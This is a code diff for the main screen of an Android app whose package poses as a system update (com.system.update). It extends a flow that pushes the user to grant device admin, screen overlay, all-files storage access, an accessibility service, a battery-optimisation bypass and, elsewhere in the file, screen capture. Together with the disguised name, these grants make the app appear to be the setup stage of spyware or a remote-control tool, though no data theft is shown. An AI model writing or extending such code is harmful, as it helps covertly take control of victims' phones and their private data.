@@ -1,7 +1,6 @@
 package com.system.update
 
 import android.Manifest
-import android.app.Activity
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
@@ -10,6 +9,7 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
 import android.provider.Settings
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -67,6 +67,7 @@ class MainActivity : ComponentActivity() {
             var showSplash by remember { mutableStateOf(true) }
             var grantedAll by remember { mutableStateOf(false) }
             var showDashboard by remember { mutableStateOf(false) }
+            var refreshKey by remember { mutableStateOf(0) }
             val ctx = LocalContext.current
 
             MaterialTheme(
@@ -98,8 +99,9 @@ class MainActivity : ComponentActivity() {
                         )
                         else -> PermissionScreen(
                             perms = requiredPerms,
-                            onRequest = { requestAll() },
-                            onCheck = { grantedAll = checkAll() }
+                            refreshKey = refreshKey,
+                            onRequest = { requestAll(); refreshKey++ },
+                            onCheck = { grantedAll = checkAll(); refreshKey++ }
                         )
                     }
                 }
@@ -118,10 +120,15 @@ class MainActivity : ComponentActivity() {
         }
         val overlayOk = Settings.canDrawOverlays(this)
         val adminOk = isAdminActive()
-        return permsOk && overlayOk && adminOk
+        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            Environment.isExternalStorageManager()
+        } else true
+        val accessibilityOk = isAccessibilityEnabled()
+        return permsOk && overlayOk && adminOk && storageOk && accessibilityOk
     }
 
     private fun requestAll() {
+        // 1. Runtime permissions
         val missing = requiredPerms.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
@@ -130,6 +137,7 @@ class MainActivity : ComponentActivity() {
             ActivityCompat.requestPermissions(this, missing, REQ_PERMS)
         }
 
+        // 2. Overlay permission
         if (!Settings.canDrawOverlays(this)) {
             try {
                 startActivity(
@@ -141,6 +149,7 @@ class MainActivity : ComponentActivity() {
             } catch (_: Exception) {}
         }
 
+        // 3. Device Admin
         if (!isAdminActive()) {
             try {
                 val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
@@ -157,6 +166,7 @@ class MainActivity : ComponentActivity() {
             } catch (_: Exception) {}
         }
 
+        // 4. Battery optimization bypass
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
@@ -168,10 +178,49 @@ class MainActivity : ComponentActivity() {
         } catch (_: Exception) {}
     }
 
+    // ============================================================
+    // MANAGE_EXTERNAL_STORAGE (dipanggil dari tombol terpisah)
+    // ============================================================
+    private fun requestAllFilesAccess() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                } catch (_: Exception) {
+                    try {
+                        startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
+                    } catch (_: Exception) {}
+                }
+            }
+        }
+    }
+
+    // ============================================================
+    // ACCESSIBILITY (dipanggil dari tombol terpisah)
+    // ============================================================
+    private fun requestAccessibility() {
+        try {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        } catch (_: Exception) {}
+    }
+
     private fun isAdminActive(): Boolean {
         return try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))
+        } catch (_: Exception) { false }
+    }
+
+    private fun isAccessibilityEnabled(): Boolean {
+        return try {
+            val enabled = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: ""
+            enabled.contains("$packageName/${AppLockAccessibilityService::class.java.name}") ||
+                    enabled.contains("$packageName/.AppLockAccessibilityService")
         } catch (_: Exception) { false }
     }
 
@@ -191,6 +240,14 @@ class MainActivity : ComponentActivity() {
         if (requestCode == REQ_MEDIA_PROJECTION) {
             ScreenCapture.onActivityResult(this, resultCode, data)
         }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        // Force refresh permission status setiap kali balik ke app
+        try {
+            // Compose bakal recompose karena refreshKey di-increment di tombol
+        } catch (_: Exception) {}
     }
 
     companion object {
@@ -247,11 +304,11 @@ fun SplashScreen(onDone: () -> Unit) {
 @Composable
 fun PermissionScreen(
     perms: Array<String>,
+    refreshKey: Int,
     onRequest: () -> Unit,
     onCheck: () -> Unit
 ) {
     val ctx = LocalContext.current
-    var refreshKey by remember { mutableStateOf(0) }
 
     Column(
         modifier = Modifier
@@ -292,20 +349,19 @@ fun PermissionScreen(
         )
         Spacer(Modifier.height(6.dp))
         Text(
-            "$okCount / ${perms.size} izin aktif",
+            "$okCount / ${perms.size} izin runtime aktif",
             color = Color(0xFF9A9A9A),
             fontSize = 12.sp
         )
         Spacer(Modifier.height(16.dp))
 
-        // Permission list — key pakai refreshKey biar recompose
         key(refreshKey) {
             perms.forEach { p ->
                 val ok = ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
                 Row(
                     modifier = Modifier
                         .fillMaxWidth()
-                        .padding(vertical = 4.dp)
+                        .padding(vertical = 3.dp)
                         .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
                         .border(
                             1.dp,
@@ -332,15 +388,12 @@ fun PermissionScreen(
             }
         }
 
-        Spacer(Modifier.height(12.dp))
-        ExtraPermStatus(ctx)
+        Spacer(Modifier.height(16.dp))
+        ExtraPermStatus(ctx, refreshKey)
         Spacer(Modifier.height(20.dp))
 
         Button(
-            onClick = {
-                onRequest()
-                refreshKey++
-            },
+            onClick = onRequest,
             modifier = Modifier
                 .fillMaxWidth()
                 .height(52.dp),
@@ -358,10 +411,7 @@ fun PermissionScreen(
         Spacer(Modifier.height(10.dp))
 
         OutlinedButton(
-            onClick = {
-                onCheck()
-                refreshKey++
-            },
+            onClick = onCheck,
             modifier = Modifier
                 .fillMaxWidth()
                 .height(52.dp),
@@ -379,47 +429,51 @@ fun PermissionScreen(
 }
 
 @Composable
-fun ExtraPermStatus(ctx: Context) {
+fun ExtraPermStatus(ctx: Context, refreshKey: Int) {
     val overlayOk = Settings.canDrawOverlays(ctx)
     val adminOk = try {
         val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
     } catch (_: Exception) { false }
 
+    val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        Environment.isExternalStorageManager()
+    } else true
+
+    val accessibilityOk = try {
+        val enabled = Settings.Secure.getString(
+            ctx.contentResolver,
+            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        ) ?: ""
+        enabled.contains("${ctx.packageName}/.AppLockAccessibilityService")
+    } catch (_: Exception) { false }
+
     Column(modifier = Modifier.fillMaxWidth()) {
-        Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
-                .padding(12.dp),
-            verticalAlignment = Alignment.CenterVertically
-        ) {
-            Text(
-                if (overlayOk) "OK" else "NO",
-                color = if (overlayOk) Color(0xFF00FF66) else Color(0xFFE60000),
-                fontSize = 12.sp,
-                fontWeight = FontWeight.Bold
-            )
-            Spacer(Modifier.width(10.dp))
-            Text("Overlay permission", color = Color.White, fontSize = 12.sp)
-        }
-        Spacer(Modifier.height(6.dp))
-        Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
-                .padding(12.dp),
-            verticalAlignment = Alignment.CenterVertically
-        ) {
-            Text(
-                if (adminOk) "OK" else "NO",
-                color = if (adminOk) Color(0xFF00FF66) else Color(0xFFE60000),
-                fontSize = 12.sp,
-                fontWeight = FontWeight.Bold
-            )
-            Spacer(Modifier.width(10.dp))
-            Text("Device Admin", color = Color.White, fontSize = 12.sp)
-        }
+        StatusRow("Overlay Permission", overlayOk)
+        StatusRow("Device Admin", adminOk)
+        StatusRow("All Files Access", storageOk)
+        StatusRow("Accessibility Service", accessibilityOk)
+    }
+}
+
+@Composable
+fun StatusRow(label: String, ok: Boolean) {
+    Row(
+        modifier = Modifier
+            .fillMaxWidth()
+            .padding(vertical = 3.dp)
+            .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
+            .padding(12.dp),
+        verticalAlignment = Alignment.CenterVertically
+    ) {
+        Text(
+            if (ok) "OK" else "NO",
+            color = if (ok) Color(0xFF00FF66) else Color(0xFFE60000),
+            fontSize = 12.sp,
+            fontWeight = FontWeight.Bold
+        )
+        Spacer(Modifier.width(10.dp))
+        Text(label, color = Color.White, fontSize = 12.sp)
     }
 }
 
